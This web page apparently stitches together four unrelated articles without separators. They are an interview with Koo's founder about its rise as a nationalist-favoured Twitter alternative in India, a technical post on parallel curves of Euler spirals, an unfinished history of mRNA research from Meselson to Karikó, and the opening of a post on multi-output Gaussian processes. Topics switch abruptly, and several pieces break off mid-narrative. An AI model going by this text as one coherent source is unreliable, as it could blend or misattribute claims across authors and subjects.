<p>After weeks of battling with Twitter, some of India’s most prominent Hindu nationalist politicians took to their social accounts and instructed their followers to leave Western social networks for Koo, a local, free-speech platform. “I am now on Koo,” <a href="https://twitter.com/PiyushGoyal/status/1359058583934013442">tweeted</a> India’s minister of commerce and industry, Piyush Goyal. “Connect with me on this Indian micro-blogging platform for real-time, exciting and exclusive updates.” Many of his <a href="https://twitter.com/PiyushGoyal">9.6 million followers</a> obliged. More right-wing politicians <a href="https://twitter.com/rsprasad/status/1360067772571545606?s=20">followed suit</a>, as did some of <a href="https://twitter.com/KanganaTeam/status/1361421114220576768">Bollywood</a>’s biggest stars.&nbsp;</p>



<p>Overnight, the platform went from a relatively obscure app to <a href="https://timesofindia.indiatimes.com/business/india-business/koo-lines-up-indian-investors-as-popularity-surges/articleshow/80867206.cms">headline news</a> and bagged <a href="https://economictimes.indiatimes.com/tech/funding/microblogging-platform-koo-bags-4-1-million-in-funding/articleshow/80685024.cms">$4.1 million in series A funding</a>.&nbsp;</p>



<p>Radhakrishna and his platform are in a curious position. The founder insists he’s apolitical — he’s appeared in both <a href="https://www.ndtv.com/video/news/news/koo-app-everything-you-need-to-know-about-koo-the-indian-alternative-to-twitter-575160">left-leaning</a> and <a href="https://www.opindia.com/2021/02/rahul-roushan-aprameya-radhakrishna-koo-co-founder-twitter-alternative-made-in-india-interview/">right-wing</a> outlets in the days since Koo has found the limelight — but is happily embracing the sudden rush to his app: Koo crossed <a href="https://www.livemint.com/technology/apps/koo-sees-10-fold-increase-in-downloads-this-week-crosses-3-million-users-11613038170243.html">3 million users </a>this month, fueled in large part by Modi’s party.&nbsp;</p>



<p>And while it’s unclear whether Koo will follow in the path of other social platforms <a href="https://www.usatoday.com/story/tech/2020/11/11/parler-mewe-gab-social-media-trump-election-facebook-twitter/6232351002/">that espouse “free speech” ideology</a>, it’s likely more Indian apps like Radhakrishna’s will follow. Prominent among Modi’s mantras for his vision of India is <em>Atmanirbhar Bharat: </em>a self-sufficient India. That vision <a href="https://restofworld.org/2021/indias-hashtag-war/">extends to the internet and social media</a>.&nbsp;</p>



<p>Six months before prominent right-wing politicians began heralding his app as India’s Twitter, Radhakrishna and his team submitted Koo to a government <em>atmanirbhar </em>social media challenge, <a href="https://navbharattimes.indiatimes.com/business/business-news/koo-app-wins-pm-modi-aatm-nirbhar-app-innovation-challenge/articleshow/77432196.cms">and won</a>.</p>



<p>Radhakrishna spoke to <em>Rest Of World </em>over Google Meet from Bangalore. This conversation has been edited for length and clarity.</p>



<hr>



<h4><strong>Tell me a bit about how you came up with the idea for Koo.&nbsp;</strong></h4>



<p>We started building it in November 2019 and launched it in March 2020. The idea behind it was that Twitter is existing in English in India, but the language speakers of India are not on Twitter. Let’s build a deeper experience for the language speakers. And because we built a deeper experience for the language speakers, we were able to make a very localized community.&nbsp;</p>



<p>We started with Kannada, then we did Hindi, then Telugu, Marathi, then Tamil: we launched all of these languages. Then, we started noticing Twitter was getting into trouble in the U.S. We said, Maybe we should just have English as well as the local languages, if ever Twitter gets into trouble or users want a separate option.&nbsp;</p>

<h4><strong>When you started Koo, how soon were you approached by government officials who saw the </strong><a href="http://www.makeinindia.com/about"><strong>“Make in India”</strong></a><strong> potential for the app?&nbsp;</strong></h4>



<p>We were a two-month-old app when we applied to the <a href="https://innovate.mygov.in/app-challenge/">[<em>Atmanibhar Bharat</em>]</a> challenge. We got into that challenge at the last minute, almost. Nobody approached us or anything. We applied just like any other startup — there were something like 7,000 social media startups that applied. We won that challenge, so that put us into the limelight: Oh, there’s an alternative microblogging platform that promotes local language<em>.&nbsp;</em></p>



<h4><strong>Walk me through how the last two or three weeks have been for you. Did you know that Piyush Goyal and the Ministry of Electronics and Technology would be encouraging their followers on Twitter to move to Koo en masse?&nbsp;</strong></h4>



<p>No. It’s been totally surreal for us. It’s totally welcome at Koo. We as a company are benefiting from the love that users who are shifting [from Twitter] are showing us. We weren’t expecting it, but it’s a pleasant surprise. We’re happy this move is happening.&nbsp;</p>



<h4><strong>Were you prepared for the sudden influx of users on the back end?&nbsp;</strong></h4>



<p>Not at all. Scaling 10x suddenly, in a week, is a challenge for any company, especially a 10-month-old startup. But we’ve come through it; we are able to scale faster.&nbsp;</p>



<h4><strong>What were the user numbers like? Can you tell me how quickly they grew after the events of this month?&nbsp;</strong></h4>



<p>We were very small, we were sub-100,000 DAU [daily active users]. Now we’re close to a million DAU. Close, not a million yet but close.&nbsp;</p>



<h4><strong>By virtue of chance, or deliberate action, there’s an ideological framework under which Koo has been positioned. You don’t seem bothered by the fact that Koo is heralded </strong><a href="https://www.bbc.com/news/world-asia-india-56037901"><strong>as the right-wing’s answer to Twitter</strong></a><strong>. Politics has played a role in the sudden attention that Koo has received. Have you considered the risks of embracing the way your app has been politicized?&nbsp;</strong></h4>



<p>It depends on the actions on the app. That first community [we built] in Kannada was built in a slower manner, and it has people from all parties in Karnataka.&nbsp;</p>



<p>What we are seeing is that India wants to be more self-reliant. India includes everybody. Our app doesn’t understand “left” or “right.” <em>I </em>don’t understand “left” or “right.” I’m an entrepreneur; I’m extremely apolitical. And I’m all for the development of the country. If Koo as a statement can make us self-reliant on our own social networks and technology, then we should be cheering for it. We shouldn’t unnecessarily politicize it.</p>



<h4><strong>Social media is shaped by its users and early adopters. Most of Koo’s early video content partnerships with, say, Republic TV [a channel </strong><a href="https://www.theguardian.com/media/2020/dec/23/indian-news-channel-fined-in-uk-for-hate-speech-about-pakistan"><strong>notorious for its allegiance</strong></a><strong> with the ruling Hindu nationalist party] or Mitron [a short-form video app that Modi supporters </strong><a href="https://www.techradar.com/news/mitron-app-gives-tiktok-a-challenge-will-it-sustain-though"><strong>have embraced after the ban on TikTok</strong></a><strong>] have come to associate the app with a particular ideology. Are you worried Koo might get too polarized too quickly?&nbsp;</strong></h4>



<p>Not at all. In Karnataka, we have everybody [on Koo], as I said. As a business, we keep looking for partners to grow our business. Now, the partners who come aggressively and see the vision that we’re seeing as a free-expression platform and embrace the platform, we’re happy to welcome them. Why would I say no to somebody who wants to use our platform? Republic [TV] came first, that doesn’t mean I don’t want everybody else.&nbsp;</p>

<h4><strong>In a recent BBC report about your app, there’s a rhetorical question, </strong><a href="https://www.bbc.com/news/world-asia-india-56037901"><strong>“Is Koo India’s Parler?”</strong></a><strong> What do you make of that comparison?&nbsp;</strong></h4>



<p>Each platform comes into being for different reasons. I’ve already explained my story. We were doing this irrespective of whether Twitter existed, got banned, got into trouble, or flourished in India.&nbsp;</p>



<p>We started in November 2019 because we said the voice of the Indian user who doesn’t speak English is not there. We are building an inclusive social media network for India. So what was your question?&nbsp;</p>



<h4><strong>My question was what do you make of Parler and—</strong></h4>



<p>Parler came into existence because there was an anti-Trump thing, and they wanted to do a pro-Trump thing. We don’t exist because of some anti or pro thing. We are existing today irrespective of whether Twitter gets into trouble or not, irrespective of one ideology being there or not. We exist because we want to give a voice to every Indian. The purpose of our existence is very different from what a Parler is.&nbsp;</p>



<h4><strong>What do you make of the “Make in India” push, considering Facebook and Twitter have </strong><a href="https://www.nytimes.com/2021/01/14/technology/trump-facebook-twitter.html"><strong>an undeniable influence</strong></a><strong> in our current political discourse?</strong></h4>



<p>Every social media [platform] has to be responsible, to a certain extent, of what they bring into a country because it defines a lot of things in the country, like youth culture or how citizens of a country react to a situation.&nbsp;</p>



<p>When a company is registered elsewhere and doesn’t take into consideration the nuances of the local culture, I think it can be dangerous. Indian entrepreneurs building for Indian cultural nuances is better than somebody who doesn’t understand the cultural nuances trying to build for India.</p>

<p><img src="https://raphlinus.github.io/assets/euler-parallel-flower.svg" alt="Many parallel curve of an Euler spiral, resembling a flower"></p>

<p>Determining <a href="https://en.wikipedia.org/wiki/Parallel_curve">parallel curves</a> is one of the basic 2D geometry operations. It has obvious applications in graphics, being the basis of creating a stroke outline from a path, but also in computer aided manufacturing (determining the path of a milling tool with finite radius) and path planning for robotics. There are plenty of solutions in the literature by now, but in this post I propose a cleaner solution.</p>

<p>A good survey paper is <a href="https://www.semanticscholar.org/paper/Comparing-Offset-Curve-Approximation-Methods-Elber-Lee/9ac1978746ec54bdd555b906e2ea1eb922cd6ffd">Comparing Offset Curve Approximation Methods</a>. The main difference between these approaches is the choice of curve representation. An example of a curve representation highly specialized for deriving parallel curves is the <a href="https://www.semanticscholar.org/paper/Pythagorean-hodographs-Farouki-Sakkalis/e20aeb60de908061797b6eaf3af79fdc7e5acdd7">Pythagorean Hodograph</a>. This parallel curve of a Pythagorean Hodograph is an exact parametric polynomial curve, but approximation techniques are still needed in practice, both to convert the source curve into the representation, and because the resulting curves are higher order rational polynomials, which require further approximation to convert into, say, cubic Béziers.</p>

<p>Specifically, this blog proposes piecewise Euler spirals as a curve representation particularly well suited to the parallel curve problem.</p>

<p>There’s an implementation of many of these ideas (currently still in PR stage) in <a href="https://github.com/linebender/kurbo/pull/169">kurbo</a>. I also used a colab notebook to explore a bunch of the math, and I’ve made a <a href="https://github.com/raphlinus/raphlinus.github.io/blob/master/assets/Euler_spiral_scratchpad.ipynb">copy of that available</a> as well.</p>

<h2 id="the-cusp">The cusp</h2>

<p>One of the things that makes parallel curves special is that cusps often appear. In particular, a cusp appears whenever the radius of curvature of the source curve matches the offset. This is classified as an <a href="https://en.wikipedia.org/wiki/Cusp_(singularity)">ordinary cusp</a> and is a feature of many curve families – we’ll quantify that a bit more below.</p>

<p><img src="https://raphlinus.github.io/assets/euler-parallel-cusp.svg" alt="Parallel curve of an Euler spiral, showing the cusp"></p>

<p>A common feature of algorithms for computing parallel curves is identifying the location of the cusp, and subdividing there. That basically means solving for the specific value of curvature (the reciprocal of the offset distance). If the source curve is a cubic Bézier, there can be up to four such cusps, and finding them requires some nontrivial numerical solving.</p>

<h2 id="curvature-as-a-function-of-arclength">Curvature as a function of arclength</h2>

<p>A theme of my approach to parallel curves (and much of my curve work in general, including my <a href="https://www.levien.com/phd/phd.html">thesis</a>), is to consider the relationship of curvature to arclength. A concrete intuition is that it is the position of the steering wheel as a car drives along the curve at constant speed. For some curves, curvature can be represented as a closed-form analytical formula as a function of arclength (the <a href="https://en.wikipedia.org/wiki/Ces%C3%A0ro_equation">Cesàro equation</a>), but in general determining the relation requires numerical techniques. For example, in the <a href="https://levien.com/euler_explorer/">Euler explorer</a>, there’s a plot of curvature as a function of arclength below the interactive cubic Bézier. Experimenting with that is an excellent way to develop intuition.</p>

<p>One curve that <em>does</em> have an especially simple Cesàro equation is the Euler spiral. An Euler spiral segment has this formula:</p><p>

\[\kappa(s) = \kappa_0 + \kappa_1 s\]

</p><p>(A note for those trying to follow along with the detailed math and code: most of the math and numerical code uses $-0.5 \leq s \leq 0.5$ because it helps exploit even/odd symmetries, but the convention for parametrized curves, including the <a href="https://docs.rs/kurbo/0.8.0/kurbo/trait.ParamCurve.html">ParamCurve</a> trait in kurbo, is $0 \leq s \leq 1$. Thus, you’ll frequently see offsets of 0.5. Similarly, you’ll see various scaling to the actual arc length, while the parametrized curve convention assumes an arc length of 1. In this blog, we’ll skim over such details, as the goal is to provide intuition without too much clutter from details.)</p>

<h2 id="the-parallel-curve-of-an-euler-spiral">The parallel curve of an Euler spiral</h2>

<p>In general, most curves do not have a simple formula for their parallel curve. The obvious exception is a circular arc, for which the parallel curve is another circular arc. Another curve family with tractable representation for its parallel curve is Pythagorean Hodographs.</p>

<p>Thanks to its exceptionally simple formulation as a Cesàro equation, the Euler spiral is one of the rare curves with a simple closed-form equation for its parallel curve. That equation was first published in a 1906 paper by Heinrich Wieleitner, <a href="https://books.google.com/books?id=UvpZAAAAYAAJ&amp;pg=PA373&amp;lpg=PA373&amp;dq=%22Die+Parallelkurve+der+Klothoide%22&amp;source=bl&amp;ots=fuY39VdPpd&amp;sig=K0AbL03rXAm_g4J9KsheQbbxyaA&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwiUrcD1poTfAhVvFjQIHVthBPoQ6AEwAnoECAMQAQ#v=onepage&amp;q=%22Die%20Parallelkurve%20der%20Klothoide%22&amp;f=false">Die Parallelkurve der Klothoide</a>. For those who don’t read German, <a href="https://github.com/Rahix">Rahix</a> has kindly provided a translation into English: <a href="https://raphlinus.github.io/assets/clothoids.pdf">PDF</a>, <a href="https://raphlinus.github.io/assets/clothoids.text">TeX source</a>.</p>

<p>Going over this math, I see Wieleitner missed an opportunity for further simplification. The style at the time was to write the Cesàro equation in terms of the <em>radius</em> of curvature (the reciprocal of curvature), but especially for the Euler spiral and its parallel curve, using curvature directly yields a much simpler equation. With the cusp located at $s_0$, the equation is gratifyingly simple:</p><p>

\[\kappa(s) = \frac{c}{\sqrt{s - s_0}} + \frac{1}{l}\]

</p><p>The equation is graphed below, and clicking on it links to a <a href="https://www.desmos.com/calculator/qznzk9xnac">Desmos calculator graph</a> with sliders for the parameters.</p>

<p><a href="https://www.desmos.com/calculator/qznzk9xnac"><img src="https://raphlinus.github.io/assets/euler-spiral-parallel-cesaro.png" width="400" height="400"></a></p>

<p>Here $c$ is a coefficient dependent on the parameters of the spiral. To connect it to the notation in the Wieleitner paper, $c = a / \sqrt{2 l^3}$, and $s_0 = -a^2/{2l}$. I’ve also made a <a href="https://www.desmos.com/calculator/imvqywsb8o">Desmos calculator graph</a> that interactively demonstrates the equivalence of this equation and the more involved one from the Wieleitner paper.</p>

<p>There are a number of other curves that have a cusp similar to the above, with characteristic inverse-square root curvature. The clearest connection is the <a href="https://en.wikipedia.org/wiki/Involute">circle involute</a>, which is the same but without the $1/l$ term, or in other words the Euler spiral parallel curve approaches the circle involute as the offset goes to infinity. This provides intuition for the fact that a circle involute is its own parallel curve. The circle involute is perhaps most famous as the optimized profile for meshing <a href="https://ciechanow.ski/gears/">gear</a> teeth, transferring force smoothly with no slop or friction.</p>

<p>Other curves with a similar cusp include the <a href="https://en.wikipedia.org/wiki/Cycloid">cycloid</a> (as well as its many variants including epicycloid, hypocycloid, astroid, deltoid, cardioid, and nephroid), as well as the <a href="https://en.wikipedia.org/wiki/Semicubical_parabola">semicubical parabola</a>. The latter is of particular interest because it can be exactly represented as a case of a cubic Bézier (it is when the control arms form a symmetrical X).</p>

<p><img src="https://raphlinus.github.io/assets/semicubical_parabola.svg" alt="semicubical parabola"></p>

<p>The parallel curve of the Euler spiral is perfectly cromulent, and, following the tradition of Pythagorean Hodograph curves and their higher-order rational polynomials, we could simply require everything downstream to simply deal with them. But to make that downstream processing easier, we will convert back to piecewise Euler spirals, a more tractable representation.</p>

<h2 id="geometric-hermite-interpolation">Geometric Hermite interpolation</h2>

<p><a href="https://en.wikipedia.org/wiki/Hermite_interpolation">Hermite interpolation</a> is a well known technique. In its simplest form, it is used to generate a piecewise polynomial approximation to some function, where the parameters for each polynomial segment are determined from the values and derivatives of the endpoints. For example, in cubic Hermite interpolation, a cubic polynomial is determined from the values and first derivatives at the endpoints – four values, corresponding to four coefficients for the polynomial. The result is C1 continuous as the derivatives exactly match (and are equal to the source curve).</p>

<p>In 2D, there is a distinction between C1 and G1 (geometric) continuity. In C1 continuity, the full derivatives must match, both direction and magnitude. For applications such as animating motion curves, the magnitude is important (it represents speed of motion), but for curves, it is not. G1 continuity requires that the tangents match, but does not specify the magnitude of the derivatives.</p>

<p>In these applications, geometric Hermite interpolation is more efficient, as all parameters of the curve are available to make the shape fit. The Euler spiral is especially well suited to geometric Hermite interpolation, and there is literature on this topic. For reasonable assumptions of smoothness (excluding fractal curves but including simple cusps), the accuracy scales as $O(n^4)$ – a doubling of the number of subdivisions reduces the error by a factor of 16. This scaling is the same as cubic Hermite interpolation of a 1D function, not surprising as an Euler spiral segment approximates a cubic polynomial when $y$ values are small.</p>

<p>Section 8.2 of my <a href="https://www.levien.com/phd/phd.html">thesis</a> provides a secant method for determining the Euler spiral parameters from the G1 Hermite constraints, and that’s implemented in the <code>fit_euler</code> method in the <a href="https://github.com/linebender/kurbo/pull/169">kurbo PR</a>. That’s a good technique and its convergence is excellent (quadratic, as typical for Newton-style solvers for near-linear problems), but I’ve also been experimenting with ways to do it better. The linked notebook explores a polynomial approximation (based on 2D Taylor’s series) that is much faster – 7ns vs 240ns in my measurements, and should be very accurate over a wide range of parameters. I’m not quite done making the error bounds rigorous, but this approach should help make the overall algorithm lightning-fast.</p>

<p>Geometric Hermite interpolation works well to approximate the parallel curve of an Euler spiral segment with another Euler spiral segment:</p>

<p><img src="https://raphlinus.github.io/assets/euler-parallel-approx.svg" alt="Approximation of the parallel curve of an Euler spiral segment"></p>

<p>The true parallel curve is in blue, and the approximation in red. It has the same rough shape, but bulges out in the middle. We need to be able to estimate that error in order to make a more accurate approximation.</p>

<h3 id="a-simple-accurate-error-metric">A simple, accurate error metric</h3>

<p>The most common approach to approximation given a target error bound is adaptive subdivision: approximate the error, and if it exceeds the target, subdivide. Evaluating the error is not always easy; most generally, it’s based on numerical techniques such as evaluating the curve at several points along its length and testing how near those points lie to the source curve.</p>

<p>Fortunately, for approximating an Euler spiral parallel curve using an Euler spiral, there is an extremely simple formula for the error. In fact, it’s possible to avoid the adaptive subdivision altogether, and precisely predict how many subdivisions are needed to meet an error bound, as well as analytically place the subdivisions so each segment has the same error.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Sixty years ago, the scientists who were pioneering the technology that would make today's COVID-19 vaccines possible were mocked and dismissed</p><div>
																		<p>A few days before Christmas, Matthew Meselson, a 90-year-old professor at Harvard, called his university’s health service to inquire about being vaccinated against COVID-19. He was eager for his shot. Meselson felt imprisoned in his Cambridge apartment, just blocks from the campus where he’d worked for six decades. He’d officially retired from teaching at the beginning of 2020, but continued his research as much as possible throughout the pandemic, wearing a K95 mask to work in his lab.</p>
<p>He longed to re-engage in the world around him. He missed his weekly date with close friends over lunch at Boston’s best French restaurant; they’d switched to Zoom, but staring into a computer screen is no replacement for lingering at linen-covered tables. He longed for his wife of 32 years, Jeanne Guillemin, who died from cancer late in 2019. Meselson was still figuring out how his world worked without her, and isolation made this hard task harder.</p>
<p>The person on the other end of the phone apologized to the professor. “We don’t have a vaccine schedule yet,” she told him.</p>
<p>The first two COVID-19 vaccines to be approved for use in North America were developed, tested and delivered into freezers before many jurisdictions figured out how to administer them. The vaccines from Pfizer-BioNTech and Moderna are the first approved vaccines ever to employ modified mRNA, which is delivered sealed in a lipid shell. The mRNA slips into our cells, carrying instructions to make antibodies that target SARS-CoV-2. The vaccines function almost like a wanted poster: if you see these guys, get ’em. Then, the mRNA degrades, leaving no trace.</p>
<blockquote><p><strong>READ:&nbsp;<a href="https://www.macleans.ca/news/covid-19-vaccines-curbing-pandemic-vaxx-populi/">How quickly will the COVID-19 vaccines start curbing the pandemic in Canada?</a></strong></p></blockquote>
<p>The fact that mRNA is the basis of these vaccines contributed to their rapid development. In November, the <em>New York Times</em> reported that within two days of China releasing the genetic sequence of SARS-CoV-2, scientists at Moderna Inc., a 10-year-old company headquartered not far from Meselson’s home in Cambridge, “plugged that data into its computers and came up with a design for an mRNA vaccine.” Meanwhile, BioNTech, a small biotech company in Germany that had been working on mRNA flu vaccines with the pharmaceutical powerhouse Pfizer, soon similarly turned its resources to generating an mRNA COVID vaccine.</p>
<p>But these fastest vaccines in history have been decades in the making. They’re the product of generations of scientists who built on one idea after another, and kept at it despite failed experiments, rejections, threats of deportation, a lack of funding and skepticism from contemporaries. They were inspired by the discovery of DNA: in 1951, a young English physical chemist named Rosalind Franklin took X-ray photographs that captured DNA’s helical shape; two years later, James Watson and Francis Crick of Cambridge University published the first report describing DNA’s double helix, for which they received the Nobel Prize. (Franklin died of ovarian cancer in 1958; her contributions were largely overlooked in her lifetime.) And they were driven not by a race to halt a raging pathogen or by the chance to patent a multi-billion-dollar drug, but by one big, irresistible question: What makes life?</p>
<p>“These weren’t people who wanted to solve little problems,” says Meselson. “These were people who wanted to solve a great big problem.”</p>
<p>He was one of them.</p>
<p>***</p>
<p>Born in Colorado in 1930, Meselson zipped through the sciences at a young age. By 16, he enrolled at the University of Chicago. In 1957, while doing post-doctoral work at the California Institute of Technology (Caltech), Meselson and Frank Stahl demonstrated how DNA replicates itself, a model that had been suggested but never shown. Science historian Frederic Lawrence Holmes later characterized their work as “the most beautiful experiment in biology,” having revealed how life worked.</p>
<p>But many unanswered questions remained about what happens inside our cells. Meselson and colleagues knew that DNA resides in the nucleus, a compartment barricaded off from the rest of the cell by a membrane. On the other side of the membrane is the cytoplasm, a gelatinous liquid that fills the remainder of the cell. This is the home of tiny granules called ribosomes, which house RNA.</p>
<p>Around the same time that Meselson and Stahl published their groundbreaking work on DNA, French scientists discovered that cells made proteins through the ribosomes. DNA, despite holding the critical codes for life, is a relatively passive molecule. Ribosomes do the busy labour, building proteins to carry out the biological processes of survival. The question was how?</p>
<p>One of the French scientists, Dr. François Jacob, theorized that there must be an “unstable intermediary” that went between the DNA and the RNA—sending messages from the DNA to the RNA, and then disappearing.</p>
<p>Jacob, a physician who’d been forced from medical school when Germany invaded France in 1940 and spent the war years fighting with Charles de Gaulle’s Free French Forces, called this theoretical intermediary “X.” Other researchers “rolled their eyes in horror” when he presented his theory, Jacob recalled in his memoir, <em>The Statue Within</em>. “With a little encouragement, my audience would have jeered and left,” he wrote.</p>

<p>In spring 1960, Jacob wrote to Meselson with a proposal: he and Sydney Brenner, a South African biologist at the University of Cambridge, would meet at Meselson’s lab at Caltech to find X. Meselson, who was in his first year on faculty, had developed a technique to track smaller molecules inside a cell. Jacob believed this technique would help identify X. That summer, with Jacob and Brenner in his lab, Meselson set up initial cultures and tests. Brenner took over the operations, while Jacob sat in a chair taking notes—pain from bomb fragments in his legs was worsened by the California humidity, says Meselson. For three weeks, they met with one failure after another. The ribosomes kept falling apart. Other scientists poked their heads in periodically and asked sarcastically for news of X. Jacob wrote that they “came to visit as one would visit the zoo.” On the trio’s very last scheduled day in the lab, Meselson, having given up on X, left. He flew to Boston to propose to his first wife.</p>
<p>Dejected, Jacob and Brenner went to Malibu Beach. The duo lay on the beach, watching huge waves of the Pacific crashing onto the sand and contemplating where their idea had gone wrong. Jacob wrote in his memoir: “Suddenly, Sydney gives a hoot. He leaps up, yelling, ‘The magnesium! It’s the magnesium!’ ” They raced back to the lab to run the experiment one last time, with additional magnesium. The result was spectacular. X existed.</p>
<blockquote><p><strong>READ:&nbsp;<a href="https://www.macleans.ca/news/theres-a-new-strain-of-covid-19-will-the-vaccines-work-against-it/">There’s a new strain of COVID-19. Will the vaccines work against it?</a></strong></p></blockquote>
<p>The pair gave a seminar the same day at Caltech to demonstrate X. Even then, no one believed them. They contacted Meselson in Boston that night to tell him. He was delighted. “It didn’t occur to me that they would figure out what was going wrong on the very last day,” he says. When the trio published their findings in 1961, they renamed X as messenger RNA.</p>
<p>They did not imagine that their finding would be used for therapeutics or a vaccine. Their questions were more philosophical. Meselson says, “We wondered what is it that allows you to put together the atoms of the ordinary periodic chart and end up with something that’s alive?”</p>
<p>Their work became the central tenet of molecular biology: DNA makes RNA makes protein makes life. It took another generation of scientists to find a way to harness RNA to treat and prevent illness.</p>
<p>***</p>
<p>As a kid in Kisújszállás, Hungary, Katalin Karikó watched her father, a butcher, dismember the carcasses of pigs. It was her first introduction to science. In the 1970s, while studying biochemistry at the University of Szeged, Karikó heard about a new report from London: interferon, a type of protein made by the body to trigger a defence against a virus, was mediated by an RNA called 2-5A. Karikó remembers a mentor talking to her about the discovery and being thrilled by the possibilities. He suggested to her that if they could make a synthetic version of a 2-5A molecule, they might be able to treat cancer or viral disease. “I immediately thought that what I was doing was tremendously important,” she says. It was the start of a 40-year quest to make synthetic RNA that could cure illness.</p>
<p>But she couldn’t secure funding in Hungary. Married with a two-year-old daughter, Karikó saw no way to continue her work in her home country. She wrote to professors throughout Europe about joining their labs, but no one could hire her. In 1985, she received an offer from Temple University in Philadelphia. If she could get to the United States, a job was waiting for her.</p>
<p>At the time, Hungarian money could not legally be converted to another currency and taken out of the country. Worried about how their family would survive until her first paycheque, Karikó and her husband, Bela Francia, sold their Russian-made car and converted the proceeds on the black market for a total of 900 British pounds. They sewed the money into their daughter’s teddy bear to smuggle it out of the country. The teddy bear’s owner, their daughter, Susan Francia, grew up to become a two-time Olympic gold medallist for the United States in rowing.</p>

  <p>This is the first post in a three-part series we are preparing on multi-output Gaussian Processes. Gaussian Processes (GPs) are a popular tool in machine learning, and a technique that we routinely use in our work.
Essentially, GPs are a powerful Bayesian tool for regression problems (which can be extended to classification problems through some modifications).
As a Bayesian approach, GPs provide a natural and automatic mechanism to construct and calibrate uncertainties.
Naturally, getting <em>well</em>-calibrated uncertainties is not easy and depends on a combination of how well the model matches the data and on how much data is available.
Predictions made using GPs are not just point predictions: they are whole probability distributions, which is convenient for downstream tasks. There are several good references for those interested in learning more about the benefits of Bayesian methods, from <a href="https://towardsdatascience.com/an-introduction-to-bayesian-inference-e6186cfc87bc">introductory</a> <a href="https://towardsdatascience.com/what-is-bayesian-statistics-used-for">blog posts</a> to <a href="https://probml.github.io/pml-book/book0.html">classical</a> <a href="http://www.stat.columbia.edu/~gelman/book/">books</a>.</p>

<p>In this post (and in the forthcoming ones in this series), we are going to assume that the reader has some level of familiarity with GPs in the single-output setting.
We will try to keep the maths to a minimum, but will rely on mathematical notation whenever that helps making the message clear.
For those who are interested in an introduction to GPs—or just a refresher—we point towards <a href="https://distill.pub/2019/visual-exploration-gaussian-processes/">other</a> <a href="https://medium.com/analytics-vidhya/intuitive-intro-to-gaussian-processes-328740cdc37f">resources</a>.
For a rigorous and in-depth introduction, the <a href="http://www.gaussianprocess.org/gpml/">book by Rasmussen and Williams</a> stands as one of the best references (and it is made freely available in electronic form by the authors).</p>

<p>We will start by discussing the extension of GPs from one to multiple dimensions, and review popular (and powerful) approaches from the literature.
In the following posts, we will look further into some powerful tricks that bring improved scalability and will also share some of our code.</p>

<h2 id="multi-output-gps">Multi-output GPs</h2>

<p>While most people with a background in machine learning or statistics are familiar with GPs, it is not uncommon to have only encountered their single-output formulation.
However, many interesting problems require the modelling of multiple outputs instead of just one.
Fortunately, it is simple to extend single-output GPs to multiple outputs, and there are a few different ways of doing so. We will call these constructions multi-output GPs (MOGPs).</p>

<p>An example application of a MOGP might be to predict both temperature and humidity as a function of time. Sometimes we might want to include binary or categorical outputs as well, but in this article we will limit the discussion to real-valued outputs.
(MOGPs are also sometimes called multi-task GPs, in which case an output is instead referred to as a task. But the idea is the same.)
Moreover we will refer to inputs as time, as in the time series setting, but all the discussion in here is valid for any kind of input.</p>

<p>The simplest way to extend GPs to multi-output problems is to model each of the outputs independently, with single-output GPs.
We call this model IGPs (for independent GPs). While conceptually simple, computationally cheap, and easy to implement, this approach fails to account for correlations between outputs.
If the outputs are correlated, knowing one can provide useful information about others (as we illustrate below), so assuming independence can hurt performance and, in many cases, limit it to being used as a baseline.</p>

<p>To define a general MOGP, all we have to do is to also specify how the outputs covary.
Perhaps the simplest way of doing this is by prescribing an additional covariance function (kernel) over outputs, \(k_{\mathrm{o}}(i, j)\), which specifies the covariance between outputs \(i\) and \(j\).
Combining this kernel over outputs with a kernel over inputs, e.g. \(k_{\mathrm{t}}(t, t')\), the full kernel of the MOGP is then given by</p><p>

\[\begin{equation}

k((i, t), (j, t')) = \operatorname{cov}(f_i(t), f_j(t')) = k_{\mathrm{o}}(i, j) k_{\mathrm{t}}(t, t'),

\end{equation}\]

</p><p>which says that the covariance between output \(i\) at input \(t\) and output \(j\) at input \(t'\) is equal to the product \(k_{\mathrm{o}}(i, j) k_{\mathrm{t}}(t, t')\).
When the kernel \(k((i, t), (j, t'))\) is a product between a kernel over outputs \(k_{\mathrm{o}}(i, j)\) and a kernel over inputs \(k_{\mathrm{t}}(t,t’)\), the kernel \(k((i, t), (j, t'))\) is called <em>separable</em>.
In the general case, the kernel \(k((i, t), (j, t'))\) does not have to be separable, i.e. it can be any arbitrary <a href="https://en.wikipedia.org/wiki/Positive-definite_function">positive-definite function</a>.</p>

<p>Contrary to IGPs, general MOGPs do model correlations between outputs, which means that they are able to use observations from one output to better predict another output.
We illustrate this below by contrasting the predictions for two of the outputs in the <a href="https://sccn.ucsd.edu/~arno/fam2data/publicly_available_EEG_data.html">EEG dataset</a>, one observed and one not observed, using IGPs and another flavour of MOGPs, the ILMM, which we will discuss in detail in the next section. Contrary to the independent GP (IGP), the ILMM is able to successfully predict F2 by exploiting the observations for F3 (and other outputs not shown).</p>

<p><img src="https://invenia.github.io/blog/public/images/eeg.png" alt="IGP_vs_MOGP">
Figure 1: Predictions for two of the outputs in the EEG dataset using two distinct MOGP approaches, the ILMM and the IGP.
All outputs are modelled jointly, but we only plot two of them for clarity.</p>

<h3 id="equivalence-to-single-output-gps">Equivalence to single-output GPs</h3>

<p>An interesting thing to notice is that a general MOGP kernel is just another kernel, like those used in single-output GPs, but one that now operates on an <em>extended</em> input space (because it also takes in \(i\) and \(j\) as input).
Mathematically, say one wants to model \(p\) outputs over some input space \(\mathcal{T}\).
By also letting the index of the output be part of the input, we can construct this extended input space: \(\mathcal{T}_{\mathrm{ext}} = \{1,...,p\} \times \mathcal{T}\). Then, a multi-output Gaussian process (MOGP) can be defined via a mean function, \(m\colon \mathcal{T}_{\mathrm{ext}} \to \mathbb{R}\), and a kernel, \(k\colon \mathcal{T}_{\mathrm{ext}}^2 \to \mathbb{R}\).
Under this construction it is clear that any property of single-output GPs immediately transfers to MOGPs, because MOGPs can simply be seen as single-output GPs on an extended input space.</p>

<p>An equivalent formulation of MOGPs can be obtained by stacking the multiple outputs into a vector, creating a <em>vector-valued GP</em>.
It is sometimes helpful to view MOGPs from this perspective, in which the multiple outputs are viewed as one multidimensional output.
